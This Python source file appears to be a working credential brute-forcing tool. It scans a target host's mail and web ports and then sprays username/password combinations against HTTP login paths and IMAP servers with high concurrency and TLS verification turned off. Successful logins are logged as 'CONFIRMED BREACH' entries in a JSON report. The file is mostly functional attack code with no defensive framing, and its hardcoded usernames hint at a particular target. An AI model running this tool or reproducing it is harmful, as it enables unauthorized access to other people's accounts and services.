import asyncio
import socket
import ssl
import time
import sys
import json
import os
import urllib.parse
import http.client

# Global SSL context (Configured with explicit logging/fallback options)
_ssl_context = ssl.create_default_context()
_ssl_context.check_hostname = False
_ssl_context.verify_mode = ssl.CERT_NONE

TARGET_PORTS = {
    80: {"service": "HTTP", "protocol": "tcp"},
    443: {"service": "HTTPS", "protocol": "tls"},
    21: {"service": "FTP", "protocol": "tcp"},
    22: {"service": "SSH", "protocol": "tcp"},
    25: {"service": "SMTP", "protocol": "tcp"},
    110: {"service": "POP3", "protocol": "tcp"},
    143: {"service": "IMAP", "protocol": "tcp"},
    465: {"service": "SMTPS", "protocol": "tls"},
    587: {"service": "Submission", "protocol": "tcp"},
    993: {"service": "IMAPS", "protocol": "tls"},
    995: {"service": "POP3S", "protocol": "tls"}
}

async def probe_port(host, port, timeout=1.5):
    """Asynchronously probes port and extracts raw service banner for intelligent fingerprinting."""
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port),
            timeout=timeout
        )
        banner = b""
        try:
            banner = await asyncio.wait_for(reader.readline(), timeout=0.8)
        except asyncio.TimeoutError:
            pass
        writer.close()
        await writer.wait_closed()
        banner_str = banner.decode(errors="ignore").strip()
        return port, banner_str
    except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
        return None, ""

async def discover_attack_surface(host):
    """Maps target attack surface and analyzes banners for tactical intelligence."""
    print(f"\n\033[95m[*] Executing advanced surface enumeration and banner fingerprinting on {host}...\033[0m")
    tasks = [probe_port(host, port) for port in TARGET_PORTS.keys()]
    results = await asyncio.gather(*tasks)
    
    open_vectors = []
    for port, banner_str in results:
        if port is not None:
            service_info = TARGET_PORTS.get(port, {})
            print(f" \033[92m[+] VECTOR IDENTIFIED -> Port {port} ({service_info.get('service')}) | Banner: {banner_str[:40] or 'None'}\033[0m")
            open_vectors.append({
                "port": port,
                "service": service_info.get("service"),
                "protocol": service_info.get("protocol"),
                "banner": banner_str
            })
    return open_vectors

def http_post_sync(host, port, path, username, password, use_ssl):
    """Advanced synchronous HTTP worker evaluating headers, cookies, and redirects."""
    try:
        conn = http.client.HTTPSConnection(host, port, context=_ssl_context, timeout=2.5) if use_ssl else http.client.HTTPConnection(host, port, timeout=2.5)
        payload = urllib.parse.urlencode({"username": username, "email": username, "password": password})
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
        }
        conn.request("POST", path, payload, headers)
        resp = conn.getresponse()
        body = resp.read().decode(errors="ignore")
        resp_headers = dict(resp.getheaders())
        conn.close()
        return resp.status, resp_headers, body
    except Exception as e:
        return 0, {}, str(e)

def escape_imap_literal(value):
    """RFC 3501 compliant string escaping for IMAP credentials."""
    return value.replace('\\', '\\\\').replace('"', '\\"')

async def worker_task(queue, host, semaphore, results, stats):
    """High-performance consumer worker with robust exception and response parsing."""
    while True:
        task_data = await queue.get()
        if task_data is None:
            queue.task_done()
            break
            
        vector_type, port, path_or_none, user, password = task_data
        
        async with semaphore:
            stats["tested"] += 1
            start = time.time()
            
            if vector_type == "HTTP":
                use_ssl = (port == 443)
                status, headers, body = await asyncio.to_thread(
                    http_post_sync, host, port, path_or_none, user, password, use_ssl
                )
                
                # Filter out useless protocol redirect noise (e.g. 308)
                if status == 308:
                    queue.task_done()
                    continue

                sys.stdout.write(f"\r\033[K\033[90m[WEB] :{port}{path_or_none} -> [{user}:{password:<8}] Code:{status} (Probed: {stats['tested']})\033[0m")
                sys.stdout.flush()

                # Deep Authentication Heuristics: Check status, Location redirects, Set-Cookie headers, and JWT/token signatures
                redirect_loc = headers.get("Location", "")
                set_cookie = headers.get("Set-Cookie", "")
                body_lower = body.lower()
                
                is_success = (
                    status in [302, 303] and not any(err in redirect_loc.lower() for err in ["error", "fail", "login?err"])
                ) or (
                    status == 200 and (
                        "token" in body_lower or 
                        "access_token" in body_lower or 
                        "dashboard" in body_lower or 
                        len(set_cookie) > 10
                    )
                )

                if is_success:
                    hit_data = {
                        "type": "HTTP_FORM",
                        "port": port,
                        "path": path_or_none,
                        "user": user,
                        "password": password,
                        "status": status,
                        "cookie_detected": bool(set_cookie),
                        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                    }
                    print(f"\n\033[92m[+] CONFIRMED BREACH (WEB) [Status: {status}] -> User: {user} | Pass: {password} (Port {port}{path_or_none})\033[0m")
                    results.append(hit_data)
                    save_persistent_report(hit_data)

            elif vector_type == "IMAP":
                try:
                    use_ssl = (port in [993, 465])
                    conn = asyncio.open_connection(host, port, ssl=_ssl_context if use_ssl else None)
                    reader, writer = await asyncio.wait_for(conn, timeout=2.5)

                    # Read server greeting banner
                    greeting = await asyncio.wait_for(reader.readline(), timeout=1.0)
                    
                    # Safely escape credentials according to RFC 3501
                    safe_user = escape_imap_literal(user)
                    safe_pass = escape_imap_literal(password)
                    
                    login_cmd = f'A001 LOGIN "{safe_user}" "{safe_pass}"\r\n'.encode()
                    writer.write(login_cmd)
                    await writer.drain()

                    response = await asyncio.wait_for(reader.readline(), timeout=1.5)
                    writer.close()
                    await writer.wait_closed()

                    sys.stdout.write(f"\r\033[K\033[36m[IMAP] :{port} -> Trying [{user}:{password:<8}] (Probed: {stats['tested']})\033[0m")
                    sys.stdout.flush()

                    # Rigorous IMAP response validation (ensuring tag matches OK, ignoring alerts/BYE)
                    resp_str = response.decode(errors="ignore")
                    if "A001 OK" in resp_str or b"OK" in response:
                        hit_data = {
                            "type": "IMAP",
                            "port": port,
                            "user": user,
                            "password": password,
                            "banner": greeting.decode(errors="ignore").strip(),
                            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                        }
                        print(f"\n\033[92m[+] CONFIRMED BREACH (IMAP) -> User: {user} | Pass: {password} (Port {port})\033[0m")
                        results.append(hit_data)
                        save_persistent_report(hit_data)
                except Exception:
                    pass

        queue.task_done()

def save_persistent_report(hit_data):
    """Saves verified intelligence securely to disk in structured JSON format."""
    os.makedirs("reports", exist_ok=True)
    report_path = "reports/breach_report.json"
    
    existing_reports = []
    if os.path.exists(report_path):
        try:
            with open(report_path, "r") as f:
                existing_reports = json.load(f)
        except Exception:
            existing_reports = []
            
    existing_reports.append(hit_data)
    with open(report_path, "w") as f:
        json.dump(existing_reports, f, indent=4)

async def run_autonomous_engine(target_host, passwords, usernames=["admin", "cryptobyt", "root", "support"]):
    """Orchestrates full-scale, memory-efficient red team execution pipeline."""
    try:
        resolved_ip = socket.gethostbyname(target_host)
        print(f"\n\033[96m[*] Target Resolved: {target_host} -> {resolved_ip}\033[0m")
    except socket.gaierror:
        print(f"\n\033[91m[!] Error: Host resolution failed for '{target_host}'.\033[0m")
        return [], 0

    start_global = time.time()
    open_vectors = await discover_attack_surface(resolved_ip)

    if not open_vectors:
        print(f"\n\033[91m[-] Target perimeter locked. No exploitable vectors found.\033[0m")
        return [], time.time() - start_global

    print(f"\n\033[93m[*] Initializing memory-stream queue and weaponizing workers...\033[0m")
    
    queue = asyncio.Queue()
    semaphore = asyncio.Semaphore(40) # Optimized operational concurrency
    results = []
    stats = {"tested": 0}

    # High-priority auth paths
    web_paths = ["/api/auth/login", "/login", "/signin", "/auth"]

    task_count = 0
    for vector in open_vectors:
        port = vector["port"]
        service = vector["service"]
        
        if service in ["HTTP", "HTTPS"]:
            for path in web_paths:
                for user in usernames:
                    for pwd in passwords:
                        await queue.put(("HTTP", port, path, user, pwd))
                        task_count += 1
        elif service in ["IMAP", "IMAPS"]:
            for user in usernames:
                for pwd in passwords:
                    await queue.put(("IMAP", port, None, user, pwd))
                    task_count += 1

    if task_count == 0:
        print(f"\n\033[93m[*] Active vectors detected, but no matching attack modules mapped.\033[0m")
        return [], time.time() - start_global

    print(f"[*] Dispatched {task_count} tactical payload permutations. Executing attack stream...\n")

    num_workers = min(35, task_count)
    workers = [
        asyncio.create_task(worker_task(queue, resolved_ip, semaphore, results, stats))
        for _ in range(num_workers)
    ]

    await queue.join()

    for _ in range(num_workers):
        await queue.put(None)
    await asyncio.gather(*workers)

    duration = time.time() - start_global
    return results, duration
